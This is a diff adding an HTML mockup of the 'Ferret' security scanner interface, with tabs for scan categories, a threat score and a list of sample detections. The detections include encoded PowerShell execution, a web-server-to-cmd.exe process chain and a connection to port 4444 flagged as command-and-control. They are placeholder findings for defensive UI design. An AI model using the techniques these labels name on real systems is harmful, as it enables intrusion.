@@ -1,0 +1,1262 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Ferret — Concept C: Bento Grid + 3D Depth</title>
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
+<style>
+  *, *::before, *::after {
+    margin: 0;
+    padding: 0;
+    box-sizing: border-box;
+  }
+
+  :root {
+    --bg-deep: #09090b;
+    --bg-card: #18181b;
+    --bg-card-hover: #1f1f23;
+    --bg-elevated: #27272a;
+    --border: #27272a;
+    --border-hover: #3f3f46;
+    --accent: #06b6d4;
+    --accent-hover: #22d3ee;
+    --accent-dark: #0891b2;
+    --text-primary: #fafafa;
+    --text-secondary: #a1a1aa;
+    --text-muted: #71717a;
+    --text-dim: #52525b;
+    --critical: #ef4444;
+    --critical-bg: rgba(239, 68, 68, 0.1);
+    --high: #f97316;
+    --high-bg: rgba(249, 115, 22, 0.1);
+    --medium: #eab308;
+    --medium-bg: rgba(234, 179, 8, 0.1);
+    --low: #22c55e;
+    --low-bg: rgba(34, 197, 94, 0.1);
+    --info-blue: #3b82f6;
+    --info-purple: #a855f7;
+    --radius: 14px;
+    --radius-sm: 8px;
+    --radius-xs: 6px;
+    --shadow: 0 4px 6px rgba(0, 0, 0, 0.3), 0 1px 3px rgba(0, 0, 0, 0.2);
+    --shadow-hover: 0 8px 16px rgba(0, 0, 0, 0.4), 0 2px 6px rgba(0, 0, 0, 0.3);
+    --shadow-glow: 0 0 40px rgba(6, 182, 212, 0.15);
+    --transition: 0.2s ease;
+  }
+
+  body {
+    font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
+    background: #050507;
+    color: var(--text-primary);
+    display: flex;
+    justify-content: center;
+    align-items: flex-start;
+    min-height: 100vh;
+    padding: 40px 20px;
+    -webkit-font-smoothing: antialiased;
+    -moz-osx-font-smoothing: grayscale;
+  }
+
+  /* ── Window Frame ── */
+  .window-frame {
+    width: 800px;
+    min-height: 600px;
+    background: var(--bg-deep);
+    border-radius: 12px;
+    border: 1px solid var(--border);
+    box-shadow: 0 25px 60px rgba(0, 0, 0, 0.5), 0 0 0 1px rgba(255, 255, 255, 0.03);
+    overflow: hidden;
+  }
+
+  .title-bar {
+    height: 42px;
+    background: #0e0e11;
+    border-bottom: 1px solid var(--border);
+    display: flex;
+    align-items: center;
+    padding: 0 16px;
+    gap: 8px;
+    user-select: none;
+    -webkit-user-select: none;
+  }
+
+  .traffic-lights {
+    display: flex;
+    gap: 7px;
+    margin-right: 8px;
+  }
+
+  .traffic-dot {
+    width: 12px;
+    height: 12px;
+    border-radius: 50%;
+  }
+
+  .traffic-dot.red { background: #ff5f56; }
+  .traffic-dot.yellow { background: #ffbd2e; }
+  .traffic-dot.green { background: #27c93f; }
+
+  .title-bar-text {
+    flex: 1;
+    text-align: center;
+    font-size: 12px;
+    font-weight: 500;
+    color: var(--text-muted);
+    letter-spacing: 0.02em;
+  }
+
+  .title-bar-spacer {
+    width: 56px;
+  }
+
+  /* ── Tabs ── */
+  .tab-bar {
+    display: flex;
+    border-bottom: 1px solid var(--border);
+    padding: 0 24px;
+    background: rgba(14, 14, 17, 0.5);
+  }
+
+  .tab {
+    padding: 12px 20px;
+    font-size: 13px;
+    font-weight: 500;
+    color: var(--text-muted);
+    cursor: pointer;
+    border-bottom: 2px solid transparent;
+    transition: color var(--transition), border-color var(--transition);
+    letter-spacing: 0.01em;
+    position: relative;
+  }
+
+  .tab:hover {
+    color: var(--text-secondary);
+  }
+
+  .tab.active {
+    color: var(--text-primary);
+    border-bottom-color: var(--accent);
+  }
+
+  /* ── Content Area ── */
+  .content {
+    padding: 28px 28px 32px;
+    min-height: 558px;
+    position: relative;
+  }
+
+  .tab-content {
+    display: none;
+    animation: fadeIn 0.3s ease;
+  }
+
+  .tab-content.active {
+    display: block;
+  }
+
+  @keyframes fadeIn {
+    from { opacity: 0; transform: translateY(6px); }
+    to { opacity: 1; transform: translateY(0); }
+  }
+
+  /* ── HOME TAB ── */
+  .home-header {
+    text-align: center;
+    margin-bottom: 28px;
+  }
+
+  .brand-row {
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    gap: 10px;
+    margin-bottom: 6px;
+  }
+
+  .brand-name {
+    font-size: 28px;
+    font-weight: 600;
+    color: var(--text-primary);
+    letter-spacing: -0.02em;
+  }
+
+  .brand-by {
+    font-size: 13px;
+    font-weight: 400;
+    color: var(--text-dim);
+    margin-top: 4px;
+  }
+
+  .subtitle {
+    font-size: 15px;
+    font-weight: 600;
+    background: linear-gradient(135deg, #06b6d4, #3b82f6);
+    -webkit-background-clip: text;
+    -webkit-text-fill-color: transparent;
+    background-clip: text;
+    margin-bottom: 4px;
+    letter-spacing: 0.01em;
+  }
+
+  .shield-icon {
+    margin: 0 auto 14px;
+    width: 52px;
+    height: 52px;
+    position: relative;
+  }
+
+  .shield-icon svg {
+    filter: drop-shadow(0 0 20px rgba(6, 182, 212, 0.3));
+  }
+
+  .home-desc {
+    font-size: 14px;
+    color: var(--text-secondary);
+    line-height: 1.5;
+  }
+
+  /* System Info Card */
+  .system-info-card {
+    background: var(--bg-card);
+    border: 1px solid var(--border);
+    border-radius: var(--radius);
+    padding: 16px 20px;
+    margin-bottom: 20px;
+    box-shadow: var(--shadow);
+    display: flex;
+    gap: 32px;
+    justify-content: center;
+  }
+
+  .sys-item {
+    display: flex;
+    flex-direction: column;
+    gap: 2px;
+  }
+
+  .sys-label {
+    font-size: 10px;
+    font-weight: 500;
+    color: var(--text-dim);
+    text-transform: uppercase;
+    letter-spacing: 0.06em;
+  }
+
+  .sys-value {
+    font-size: 13px;
+    font-weight: 500;
+    color: var(--text-secondary);
+  }
+
+  /* Start Scan Button */
+  .scan-btn-wrap {
+    text-align: center;
+    margin-bottom: 24px;
+  }
+
+  .scan-btn {
+    display: inline-flex;
+    align-items: center;
+    gap: 8px;
+    padding: 12px 36px;
+    background: linear-gradient(135deg, #06b6d4, #0891b2);
+    color: #fff;
+    font-size: 15px;
+    font-weight: 600;
+    border: none;
+    border-radius: 10px;
+    cursor: pointer;
+    box-shadow: 0 4px 12px rgba(6, 182, 212, 0.3), 0 1px 3px rgba(0, 0, 0, 0.2);
+    transition: transform var(--transition), box-shadow var(--transition), filter var(--transition);
+    letter-spacing: 0.01em;
+  }
+
+  .scan-btn:hover {
+    transform: scale(1.02);
+    box-shadow: 0 6px 20px rgba(6, 182, 212, 0.4), 0 2px 6px rgba(0, 0, 0, 0.3);
+    filter: brightness(1.1);
+  }
+
+  .scan-btn:active {
+    transform: scale(0.99);
+  }
+
+  .scan-btn svg {
+    width: 18px;
+    height: 18px;
+  }
+
+  /* Bento Grid — Scan Categories */
+  .bento-grid {
+    display: grid;
+    grid-template-columns: repeat(3, 1fr);
+    gap: 12px;
+    margin-bottom: 18px;
+  }
+
+  .bento-card {
+    background: var(--bg-card);
+    border: 1px solid var(--border);
+    border-radius: var(--radius);
+    padding: 18px 16px 16px;
+    box-shadow: var(--shadow);
+    cursor: default;
+    transition: transform var(--transition), box-shadow var(--transition), border-color var(--transition);
+  }
+
+  .bento-card:hover {
+    transform: translateY(-2px);
+    box-shadow: var(--shadow-hover);
+    border-color: var(--border-hover);
+  }
+
+  .bento-card-icon {
+    width: 32px;
+    height: 32px;
+    margin-bottom: 10px;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    background: rgba(6, 182, 212, 0.08);
+    border-radius: 8px;
+    color: var(--accent);
+  }
+
+  .bento-card-icon svg {
+    width: 18px;
+    height: 18px;
+  }
+
+  .bento-card-title {
+    font-size: 13px;
+    font-weight: 600;
+    color: var(--text-primary);
+    margin-bottom: 4px;
+  }
+
+  .bento-card-desc {
+    font-size: 11px;
+    color: var(--text-muted);
+    line-height: 1.45;
+  }
+
+  .admin-notice {
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    gap: 6px;
+    font-size: 11px;
+    color: var(--text-dim);
+  }
+
+  .admin-dot {
+    width: 6px;
+    height: 6px;
+    border-radius: 50%;
+    background: #eab308;
+    display: inline-block;
+    box-shadow: 0 0 6px rgba(234, 179, 8, 0.4);
+  }
+
+  /* ── RESULTS TAB ── */
+  .results-bento {
+    display: grid;
+    grid-template-columns: 1fr 1fr;
+    gap: 12px;
+    margin-bottom: 20px;
+  }
+
+  .score-card {
+    background: var(--bg-card);
+    border: 1px solid var(--border);
+    border-radius: var(--radius);
+    padding: 28px 24px;
+    box-shadow: var(--shadow);
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    justify-content: center;
+    grid-row: span 2;
+    transition: transform var(--transition), box-shadow var(--transition);
+  }
+
+  .score-card:hover {
+    transform: translateY(-2px);
+    box-shadow: var(--shadow-hover);
+  }
+
+  .score-circle-wrap {
+    position: relative;
+    width: 130px;
+    height: 130px;
+    margin-bottom: 12px;
+  }
+
+  .score-circle-bg {
+    fill: none;
+    stroke: var(--bg-elevated);
+    stroke-width: 8;
+  }
+
+  .score-circle-fg {
+    fill: none;
+    stroke: url(#scoreGradient);
+    stroke-width: 8;
+    stroke-linecap: round;
+    stroke-dasharray: 339.292;
+    stroke-dashoffset: 94.89;
+    transform: rotate(-90deg);
+    transform-origin: center;
+    transition: stroke-dashoffset 1s ease;
+  }
+
+  .score-value {
+    position: absolute;
+    top: 50%;
+    left: 50%;
+    transform: translate(-50%, -50%);
+    text-align: center;
+  }
+
+  .score-number {
+    font-size: 36px;
+    font-weight: 700;
+    color: var(--text-primary);
+    letter-spacing: -0.03em;
+    line-height: 1;
+  }
+
+  .score-total {
+    font-size: 13px;
+    color: var(--text-dim);
+    font-weight: 400;
+  }
+
+  .score-label {
+    font-size: 12px;
+    font-weight: 600;
+    color: var(--text-muted);
+    text-transform: uppercase;
+    letter-spacing: 0.08em;
+    margin-bottom: 4px;
+  }
+
+  .score-grade {
+    font-size: 15px;
+    font-weight: 600;
+    color: var(--high);
+  }
+
+  .severity-grid {
+    display: grid;
+    grid-template-columns: 1fr 1fr;
+    gap: 12px;
+  }
+
+  .severity-card {
+    background: var(--bg-card);
+    border: 1px solid var(--border);
+    border-radius: var(--radius);
+    padding: 16px;
+    box-shadow: var(--shadow);
+    position: relative;
+    overflow: hidden;
+    transition: transform var(--transition), box-shadow var(--transition);
+  }
+
+  .severity-card:hover {
+    transform: translateY(-2px);
+    box-shadow: var(--shadow-hover);
+  }
+
+  .severity-card::before {
+    content: '';
+    position: absolute;
+    top: 0;
+    left: 0;
+    right: 0;
+    height: 3px;
+  }
+
+  .severity-card.sev-critical::before { background: var(--critical); }
+  .severity-card.sev-high::before { background: var(--high); }
+  .severity-card.sev-medium::before { background: var(--medium); }
+  .severity-card.sev-low::before { background: var(--low); }
+
+  .severity-count {
+    font-size: 28px;
+    font-weight: 700;
+    line-height: 1;
+    margin-bottom: 4px;
+  }
+
+  .severity-card.sev-critical .severity-count { color: var(--critical); }
+  .severity-card.sev-high .severity-count { color: var(--high); }
+  .severity-card.sev-medium .severity-count { color: var(--medium); }
+  .severity-card.sev-low .severity-count { color: var(--low); }
+
+  .severity-name {
+    font-size: 11px;
+    font-weight: 500;
+    color: var(--text-muted);
+    text-transform: uppercase;
+    letter-spacing: 0.06em;
+  }
+
+  /* Detection List */
+  .detection-list-header {
+    font-size: 13px;
+    font-weight: 600;
+    color: var(--text-secondary);
+    margin-bottom: 10px;
+    letter-spacing: 0.01em;
+  }
+
+  .detection-item {
+    background: var(--bg-card);
+    border: 1px solid var(--border);
+    border-radius: var(--radius-sm);
+    padding: 14px 16px;
+    margin-bottom: 8px;
+    display: flex;
+    align-items: center;
+    gap: 12px;
+    cursor: pointer;
+    box-shadow: var(--shadow);
+    transition: transform var(--transition), box-shadow var(--transition), border-color var(--transition);
+    opacity: 0;
+    animation: staggerIn 0.4s ease forwards;
+  }
+
+  .detection-item:hover {
+    transform: translateY(-1px);
+    box-shadow: var(--shadow-hover);
+    border-color: var(--border-hover);
+  }
+
+  .detection-item:nth-child(1) { animation-delay: 0.05s; }
+  .detection-item:nth-child(2) { animation-delay: 0.12s; }
+  .detection-item:nth-child(3) { animation-delay: 0.19s; }
+  .detection-item:nth-child(4) { animation-delay: 0.26s; }
+
+  @keyframes staggerIn {
+    from { opacity: 0; transform: translateY(8px); }
+    to { opacity: 1; transform: translateY(0); }
+  }
+
+  .sev-dot {
+    width: 8px;
+    height: 8px;
+    border-radius: 50%;
+    flex-shrink: 0;
+  }
+
+  .sev-dot.critical { background: var(--critical); box-shadow: 0 0 8px rgba(239, 68, 68, 0.4); }
+  .sev-dot.high { background: var(--high); box-shadow: 0 0 8px rgba(249, 115, 22, 0.3); }
+  .sev-dot.medium { background: var(--medium); box-shadow: 0 0 8px rgba(234, 179, 8, 0.3); }
+  .sev-dot.low { background: var(--low); box-shadow: 0 0 8px rgba(34, 197, 94, 0.3); }
+
+  .detection-body {
+    flex: 1;
+    min-width: 0;
+  }
+
+  .detection-desc {
+    font-size: 13px;
+    font-weight: 500;
+    color: var(--text-primary);
+    margin-bottom: 2px;
+    white-space: nowrap;
+    overflow: hidden;
+    text-overflow: ellipsis;
+  }
+
+  .detection-type {
+    font-size: 11px;
+    color: var(--text-muted);
+  }
+
+  .detection-chevron {
+    color: var(--text-dim);
+    flex-shrink: 0;
+  }
+
+  .detection-chevron svg {
+    width: 16px;
+    height: 16px;
+  }
+
+  /* CTA Banner */
+  .cta-banner {
+    margin-top: 18px;
+    background: linear-gradient(135deg, rgba(6, 182, 212, 0.12), rgba(59, 130, 246, 0.12));
+    border: 1px solid rgba(6, 182, 212, 0.2);
+    border-radius: var(--radius);
+    padding: 20px 24px;
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+    box-shadow: var(--shadow);
+  }
+
+  .cta-text {
+    font-size: 14px;
+    font-weight: 500;
+    color: var(--text-secondary);
+  }
+
+  .cta-btn {
+    display: inline-flex;
+    align-items: center;
+    gap: 6px;
+    padding: 9px 20px;
+    background: linear-gradient(135deg, #06b6d4, #3b82f6);
+    color: #fff;
+    font-size: 13px;
+    font-weight: 600;
+    border: none;
+    border-radius: 8px;
+    cursor: pointer;
+    white-space: nowrap;
+    transition: filter var(--transition), transform var(--transition);
+    letter-spacing: 0.01em;
+  }
+
+  .cta-btn:hover {
+    filter: brightness(1.1);
+    transform: translateY(-1px);
+  }
+
+  /* ── DETECTION CARD TAB ── */
+  .detail-header {
+    display: flex;
+    align-items: center;
+    gap: 12px;
+    margin-bottom: 20px;
+  }
+
+  .badge {
+    display: inline-flex;
+    align-items: center;
+    padding: 4px 10px;
+    border-radius: 6px;
+    font-size: 11px;
+    font-weight: 600;
+    text-transform: uppercase;
+    letter-spacing: 0.04em;
+  }
+
+  .badge-critical {
+    background: var(--critical-bg);
+    color: var(--critical);
+    border: 1px solid rgba(239, 68, 68, 0.25);
+  }
+
+  .detail-type {
+    font-size: 13px;
+    color: var(--text-muted);
+    font-weight: 500;
+  }
+
+  .detail-desc {
+    font-size: 18px;
+    font-weight: 600;
+    color: var(--text-primary);
+    margin-bottom: 18px;
+    line-height: 1.4;
+    letter-spacing: -0.01em;
+  }
+
+  .detail-divider {
+    height: 1px;
+    background: var(--border);
+    margin-bottom: 18px;
+  }
+
+  .section-title {
+    font-size: 12px;
+    font-weight: 600;
+    color: var(--text-muted);
+    text-transform: uppercase;
+    letter-spacing: 0.06em;
+    margin-bottom: 10px;
+  }
+
+  .detail-sub-grid {
+    display: grid;
+    grid-template-columns: 1fr 1fr;
+    gap: 12px;
+    margin-bottom: 16px;
+  }
+
+  .detail-card {
+    background: #111114;
+    border: 1px solid var(--border);
+    border-radius: var(--radius-sm);
+    padding: 16px;
+    box-shadow: var(--shadow);
+    transition: transform var(--transition), box-shadow var(--transition);
+  }
+
+  .detail-card:hover {
+    transform: translateY(-1px);
+    box-shadow: var(--shadow-hover);
+  }
+
+  .detail-card-label {
+    font-size: 10px;
+    font-weight: 500;
+    color: var(--text-dim);
+    text-transform: uppercase;
+    letter-spacing: 0.06em;
+    margin-bottom: 8px;
+  }
+
+  .process-tree {
+    display: flex;
+    align-items: center;
+    gap: 8px;
+  }
+
+  .process-node {
+    font-size: 13px;
+    font-weight: 500;
+    color: var(--text-secondary);
+    font-family: 'JetBrains Mono', monospace;
+  }
+
+  .process-arrow {
+    color: var(--text-dim);
+  }
+
+  .process-arrow svg {
+    width: 16px;
+    height: 16px;
+  }
+
+  .info-row {
+    display: flex;
+    justify-content: space-between;
+    margin-bottom: 6px;
+  }
+
+  .info-row:last-child {
+    margin-bottom: 0;
+  }
+
+  .info-key {
+    font-size: 11px;
+    color: var(--text-dim);
+    font-weight: 500;
+  }
+
+  .info-val {
+    font-size: 12px;
+    color: var(--text-secondary);
+    font-family: 'JetBrains Mono', monospace;
+    font-weight: 400;
+  }
+
+  .code-block {
+    background: #0c0c0f;
+    border: 1px solid var(--border);
+    border-radius: var(--radius-sm);
+    padding: 14px 16px;
+    margin-bottom: 16px;
+    overflow-x: auto;
+  }
+
+  .code-block code {
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 12px;
+    color: var(--text-secondary);
+    line-height: 1.6;
+    white-space: pre-wrap;
+    word-break: break-all;
+  }
+
+  .code-block .cmd-highlight {
+    color: var(--accent);
+  }
+
+  .code-block .cmd-flag {
+    color: var(--high);
+  }
+
+  /* MITRE Tags */
+  .tags-section {
+    margin-bottom: 16px;
+  }
+
+  .tags-row {
+    display: flex;
+    flex-wrap: wrap;
+    gap: 6px;
+    margin-bottom: 8px;
+  }
+
+  .tag-label {
+    font-size: 10px;
+    color: var(--text-dim);
+    font-weight: 500;
+    margin-bottom: 6px;
+    text-transform: uppercase;
+    letter-spacing: 0.05em;
+  }
+
+  .tag-pill {
+    display: inline-flex;
+    align-items: center;
+    padding: 4px 10px;
+    border-radius: 6px;
+    font-size: 11px;
+    font-weight: 500;
+  }
+
+  .tag-tactic {
+    background: rgba(59, 130, 246, 0.1);
+    color: var(--info-blue);
+    border: 1px solid rgba(59, 130, 246, 0.2);
+  }
+
+  .tag-technique {
+    background: rgba(168, 85, 247, 0.1);
+    color: var(--info-purple);
+    border: 1px solid rgba(168, 85, 247, 0.2);
+  }
+
+  /* Recommendation */
+  .recommendation-card {
+    background: rgba(6, 182, 212, 0.05);
+    border: 1px solid rgba(6, 182, 212, 0.15);
+    border-left: 3px solid var(--accent);
+    border-radius: var(--radius-sm);
+    padding: 14px 16px;
+    margin-bottom: 16px;
+  }
+
+  .recommendation-card .section-title {
+    margin-bottom: 6px;
+    color: var(--accent);
+  }
+
+  .recommendation-text {
+    font-size: 13px;
+    color: var(--text-secondary);
+    line-height: 1.55;
+  }
+
+  /* Confidence */
+  .confidence-section {
+    display: flex;
+    align-items: center;
+    gap: 12px;
+  }
+
+  .confidence-label {
+    font-size: 12px;
+    font-weight: 500;
+    color: var(--text-muted);
+    white-space: nowrap;
+  }
+
+  .confidence-bar-wrap {
+    flex: 1;
+    height: 6px;
+    background: var(--bg-elevated);
+    border-radius: 3px;
+    overflow: hidden;
+  }
+
+  .confidence-bar {
+    height: 100%;
+    background: linear-gradient(90deg, var(--critical), var(--high));
+    border-radius: 3px;
+    width: 0%;
+    transition: width 1s ease;
+  }
+
+  .confidence-pct {
+    font-size: 13px;
+    font-weight: 600;
+    color: var(--text-secondary);
+    white-space: nowrap;
+    font-variant-numeric: tabular-nums;
+  }
+
+  /* Concept label */
+  .concept-label {
+    text-align: center;
+    margin-top: 24px;
+    font-size: 11px;
+    color: var(--text-dim);
+    letter-spacing: 0.04em;
+  }
+
+  .concept-label span {
+    color: var(--text-muted);
+    font-weight: 500;
+  }
+</style>
+</head>
+<body>
+
+<div>
+  <div class="window-frame">
+    <!-- Title Bar -->
+    <div class="title-bar">
+      <div class="traffic-lights">
+        <div class="traffic-dot red"></div>
+        <div class="traffic-dot yellow"></div>
+        <div class="traffic-dot green"></div>
+      </div>
+      <div class="title-bar-text">Ferret</div>
+      <div class="title-bar-spacer"></div>
+    </div>
+
+    <!-- Tab Bar -->
+    <div class="tab-bar">
+      <div class="tab active" data-tab="home">Home</div>
+      <div class="tab" data-tab="results">Results</div>
+      <div class="tab" data-tab="detail">Detection Card</div>
+    </div>
+
+    <!-- Content -->
+    <div class="content">
+
+      <!-- ═══ HOME TAB ═══ -->
+      <div class="tab-content active" id="tab-home">
+        <div class="home-header">
+          <div class="shield-icon">
+            <svg width="52" height="52" viewBox="0 0 52 52" fill="none">
+              <path d="M26 4L6 14V26C6 38.36 14.68 49.64 26 52C37.32 49.64 46 38.36 46 26V14L26 4Z" fill="rgba(6,182,212,0.08)" stroke="#06b6d4" stroke-width="1.5" stroke-linejoin="round"/>
+              <path d="M22 28L26 32L34 22" stroke="#06b6d4" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"/>
+            </svg>
+          </div>
+          <div class="brand-row">
+            <span class="brand-name">Ferret</span>
+            <span class="brand-by">by BRIQA</span>
+          </div>
+          <div class="subtitle">Security Scanner</div>
+          <p class="home-desc">Comprehensive threat detection for your PC</p>
+        </div>
+
+        <!-- System Info -->
+        <div class="system-info-card">
+          <div class="sys-item">
+            <span class="sys-label">Hostname</span>
+            <span class="sys-value">DESKTOP-A3F7K92</span>
+          </div>
+          <div class="sys-item">
+            <span class="sys-label">OS</span>
+            <span class="sys-value">Windows 11 Pro</span>
+          </div>
+          <div class="sys-item">
+            <span class="sys-label">IP Address</span>
+            <span class="sys-value">192.168.1.105</span>
+          </div>
+        </div>
+
+        <!-- Start Scan -->
+        <div class="scan-btn-wrap">
+          <button class="scan-btn">
+            <svg viewBox="0 0 20 20" fill="currentColor"><path fill-rule="evenodd" d="M10 18a8 8 0 100-16 8 8 0 000 16zM9.555 7.168A1 1 0 008 8v4a1 1 0 001.555.832l3-2a1 1 0 000-1.664l-3-2z" clip-rule="evenodd"/></svg>
+            Start Scan
+          </button>
+        </div>
+
+        <!-- Bento Grid — Categories -->
+        <div class="bento-grid">
+          <div class="bento-card">
+            <div class="bento-card-icon">
+              <svg viewBox="0 0 20 20" fill="currentColor"><path d="M7 3a1 1 0 000 2h6a1 1 0 100-2H7zM4 7a1 1 0 011-1h10a1 1 0 110 2H5a1 1 0 01-1-1zM2 11a2 2 0 012-2h12a2 2 0 012 2v4a2 2 0 01-2 2H4a2 2 0 01-2-2v-4z"/></svg>
+            </div>
+            <div class="bento-card-title">Processes</div>
+            <div class="bento-card-desc">Analyze running processes and detect suspicious activity</div>
+          </div>
+          <div class="bento-card">
+            <div class="bento-card-icon">
+              <svg viewBox="0 0 20 20" fill="currentColor"><path fill-rule="evenodd" d="M12.586 4.586a2 2 0 112.828 2.828l-3 3a2 2 0 01-2.828 0 1 1 0 00-1.414 1.414 4 4 0 005.656 0l3-3a4 4 0 00-5.656-5.656l-1.5 1.5a1 1 0 101.414 1.414l1.5-1.5zm-5 5a2 2 0 012.828 0 1 1 0 101.414-1.414 4 4 0 00-5.656 0l-3 3a4 4 0 105.656 5.656l1.5-1.5a1 1 0 10-1.414-1.414l-1.5 1.5a2 2 0 11-2.828-2.828l3-3z" clip-rule="evenodd"/></svg>
+            </div>
+            <div class="bento-card-title">Network</div>
+            <div class="bento-card-desc">Monitor connections and flag anomalous traffic</div>
+          </div>
+          <div class="bento-card">
+            <div class="bento-card-icon">
+              <svg viewBox="0 0 20 20" fill="currentColor"><path fill-rule="evenodd" d="M11.49 3.17c-.38-1.56-2.6-1.56-2.98 0a1.532 1.532 0 01-2.286.948c-1.372-.836-2.942.734-2.106 2.106.54.886.061 2.042-.947 2.287-1.561.379-1.561 2.6 0 2.978a1.532 1.532 0 01.947 2.287c-.836 1.372.734 2.942 2.106 2.106a1.532 1.532 0 012.287.947c.379 1.561 2.6 1.561 2.978 0a1.533 1.533 0 012.287-.947c1.372.836 2.942-.734 2.106-2.106a1.533 1.533 0 01.947-2.287c1.561-.379 1.561-2.6 0-2.978a1.532 1.532 0 01-.947-2.287c.836-1.372-.734-2.942-2.106-2.106a1.532 1.532 0 01-2.287-.947zM10 13a3 3 0 100-6 3 3 0 000 6z" clip-rule="evenodd"/></svg>
+            </div>
+            <div class="bento-card-title">Services</div>
+            <div class="bento-card-desc">Inspect system services for unauthorized entries</div>
+          </div>
+          <div class="bento-card">
+            <div class="bento-card-icon">
+              <svg viewBox="0 0 20 20" fill="currentColor"><path fill-rule="evenodd" d="M18 8a6 6 0 01-7.743 5.743L10 14l-1 1-1 1H6v2H2v-4l4.257-4.257A6 6 0 1118 8zm-6-4a1 1 0 100 2 2 2 0 012 2 1 1 0 102 0 4 4 0 00-4-4z" clip-rule="evenodd"/></svg>
+            </div>
+            <div class="bento-card-title">Registry</div>
+            <div class="bento-card-desc">Scan persistence keys and startup entries</div>
+          </div>
+          <div class="bento-card">
+            <div class="bento-card-icon">
+              <svg viewBox="0 0 20 20" fill="currentColor"><path fill-rule="evenodd" d="M4 4a2 2 0 012-2h4.586A2 2 0 0112 2.586L15.414 6A2 2 0 0116 7.414V16a2 2 0 01-2 2H6a2 2 0 01-2-2V4z" clip-rule="evenodd"/></svg>
+            </div>
+            <div class="bento-card-title">Event Logs</div>
+            <div class="bento-card-desc">Parse Windows event logs for IOCs</div>
+          </div>
+          <div class="bento-card">
+            <div class="bento-card-icon">
+              <svg viewBox="0 0 20 20" fill="currentColor"><path fill-rule="evenodd" d="M12.316 3.051a1 1 0 01.633 1.265l-4 12a1 1 0 11-1.898-.632l4-12a1 1 0 011.265-.633zM5.707 6.293a1 1 0 010 1.414L3.414 10l2.293 2.293a1 1 0 11-1.414 1.414l-3-3a1 1 0 010-1.414l3-3a1 1 0 011.414 0zm8.586 0a1 1 0 011.414 0l3 3a1 1 0 010 1.414l-3 3a1 1 0 11-1.414-1.414L16.586 10l-2.293-2.293a1 1 0 010-1.414z" clip-rule="evenodd"/></svg>
+            </div>
+            <div class="bento-card-title">Sigma Rules</div>
+            <div class="bento-card-desc">63 detection rules for known threat patterns</div>
+          </div>
+        </div>
+
+        <div class="admin-notice">
+          <span class="admin-dot"></span>
+          <span>Administrator privileges recommended for full scan</span>
+        </div>
+      </div>
+
+      <!-- ═══ RESULTS TAB ═══ -->
+      <div class="tab-content" id="tab-results">
+        <!-- Score + Severity Bento -->
+        <div class="results-bento">
+          <div class="score-card">
+            <div class="score-label">Threat Score</div>
+            <div class="score-circle-wrap">
+              <svg width="130" height="130" viewBox="0 0 130 130">
+                <defs>
+                  <linearGradient id="scoreGradient" x1="0%" y1="0%" x2="100%" y2="100%">
+                    <stop offset="0%" stop-color="#f97316"/>
+                    <stop offset="100%" stop-color="#ef4444"/>
+                  </linearGradient>
+                </defs>
+                <circle cx="65" cy="65" r="54" class="score-circle-bg"/>
+                <circle cx="65" cy="65" r="54" class="score-circle-fg"/>
+              </svg>
+              <div class="score-value">
+                <div class="score-number">72</div>
+                <div class="score-total">/ 100</div>
+              </div>
+            </div>
+            <div class="score-grade">Warning</div>
+          </div>
+          <div class="severity-grid">
+            <div class="severity-card sev-critical">
+              <div class="severity-count">1</div>
+              <div class="severity-name">Critical</div>
+            </div>
+            <div class="severity-card sev-high">
+              <div class="severity-count">3</div>
+              <div class="severity-name">High</div>
+            </div>
+            <div class="severity-card sev-medium">
+              <div class="severity-count">2</div>
+              <div class="severity-name">Medium</div>
+            </div>
+            <div class="severity-card sev-low">
+              <div class="severity-count">2</div>
+              <div class="severity-name">Low</div>
+            </div>
+          </div>
+        </div>
+
+        <!-- Detection List -->
+        <div class="detection-list-header">Detections (8)</div>
+
+        <div class="detection-item">
+          <span class="sev-dot critical"></span>
+          <div class="detection-body">
+            <div class="detection-desc">powershell.exe executed with encoded commands</div>
+            <div class="detection-type">Process Anomaly</div>
+          </div>
+          <div class="detection-chevron"><svg viewBox="0 0 20 20" fill="currentColor"><path fill-rule="evenodd" d="M7.293 14.707a1 1 0 010-1.414L10.586 10 7.293 6.707a1 1 0 011.414-1.414l4 4a1 1 0 010 1.414l-4 4a1 1 0 01-1.414 0z" clip-rule="evenodd"/></svg></div>
+        </div>
+
+        <div class="detection-item">
+          <span class="sev-dot high"></span>
+          <div class="detection-body">
+            <div class="detection-desc">w3wp.exe &#8594; cmd.exe suspicious process chain</div>
+            <div class="detection-type">LOLBin Execution</div>
+          </div>
+          <div class="detection-chevron"><svg viewBox="0 0 20 20" fill="currentColor"><path fill-rule="evenodd" d="M7.293 14.707a1 1 0 010-1.414L10.586 10 7.293 6.707a1 1 0 011.414-1.414l4 4a1 1 0 010 1.414l-4 4a1 1 0 01-1.414 0z" clip-rule="evenodd"/></svg></div>
+        </div>
+
+        <div class="detection-item">
+          <span class="sev-dot high"></span>
+          <div class="detection-body">
+            <div class="detection-desc">Connection to port 4444 (C2)</div>
+            <div class="detection-type">Network Anomaly</div>
+          </div>
+          <div class="detection-chevron"><svg viewBox="0 0 20 20" fill="currentColor"><path fill-rule="evenodd" d="M7.293 14.707a1 1 0 010-1.414L10.586 10 7.293 6.707a1 1 0 011.414-1.414l4 4a1 1 0 010 1.414l-4 4a1 1 0 01-1.414 0z" clip-rule="evenodd"/></svg></div>
+        </div>
+
+        <div class="detection-item">
+          <span class="sev-dot medium"></span>
+          <div class="detection-body">
+            <div class="detection-desc">svchost.exe in unusual path</div>
+            <div class="detection-type">Process Anomaly</div>
+          </div>
+          <div class="detection-chevron"><svg viewBox="0 0 20 20" fill="currentColor"><path fill-rule="evenodd" d="M7.293 14.707a1 1 0 010-1.414L10.586 10 7.293 6.707a1 1 0 011.414-1.414l4 4a1 1 0 010 1.414l-4 4a1 1 0 01-1.414 0z" clip-rule="evenodd"/></svg></div>
+        </div>
+
+        <!-- CTA Banner -->
+        <div class="cta-banner">
